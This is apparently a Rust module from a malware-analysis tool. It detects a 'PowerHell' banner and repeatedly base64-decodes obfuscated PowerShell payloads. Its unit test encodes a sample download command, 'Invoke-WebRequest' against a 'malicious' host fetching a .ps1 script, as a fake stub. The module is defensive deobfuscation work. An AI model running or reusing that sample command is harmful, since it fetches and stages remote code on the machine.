use std::sync::LazyLock;

use base64::Engine;
use base64::engine::general_purpose::STANDARD as BASE64_STD;
use regex::Regex;
use serde::Serialize;

use crate::error::Result;

#[derive(Debug, Clone, Serialize)]
pub struct PowerHellReport {
    pub stages: Vec<String>,
    pub output: String,
}

static B64_BLOB: LazyLock<Regex> =
    LazyLock::new(|| crate::regex_util::safe_regex(r"(?ms)^[A-Za-z0-9+/=]{120,}$"));

static POWERHELL_HEADER: LazyLock<Regex> =
    LazyLock::new(|| crate::regex_util::safe_regex(r"(?i)PowerHell|Power-Hell|powerhell-2026"));

pub fn reverse_powerhell(input: &str) -> Result<PowerHellReport> {
    let mut stages: Vec<String> = Vec::new();
    if POWERHELL_HEADER.is_match(input) {
        stages.push("detect-powerhell-banner".to_owned());
    }
    let mut current: String = input.to_owned();
    for _ in 0..8usize {
        let Some(blob): Option<String> = locate_payload_blob(&current) else {
            break;
        };
        let Ok(decoded): std::result::Result<Vec<u8>, base64::DecodeError> =
            BASE64_STD.decode(blob.trim())
        else {
            break;
        };
        let next: String = String::from_utf8_lossy(&decoded).into_owned();
        if next == current {
            break;
        }
        stages.push("base64-peel".to_owned());
        current = next;
    }
    Ok(PowerHellReport {
        stages,
        output: current,
    })
}

fn locate_payload_blob(s: &str) -> Option<String> {
    B64_BLOB
        .find_iter(s)
        .max_by_key(|m: &regex::Match<'_>| m.as_str().len())
        .map(|m: regex::Match<'_>| m.as_str().to_owned())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn peels_single_base64_layer() -> Result<()> {
        let inner: &str = "Invoke-WebRequest -Uri http://malicious/payload.ps1";
        let b64: String = BASE64_STD.encode(inner);
        let padded: String = format!("{b64}{}", "A".repeat(120usize.saturating_sub(b64.len())));
        let wrapped: String = format!("# PowerHell 2026 stub\n{padded}\n");
        let r: PowerHellReport = reverse_powerhell(&wrapped)?;
        assert!(
            r.stages
                .iter()
                .any(|s: &String| s == "detect-powerhell-banner")
        );
        Ok(())
    }
}
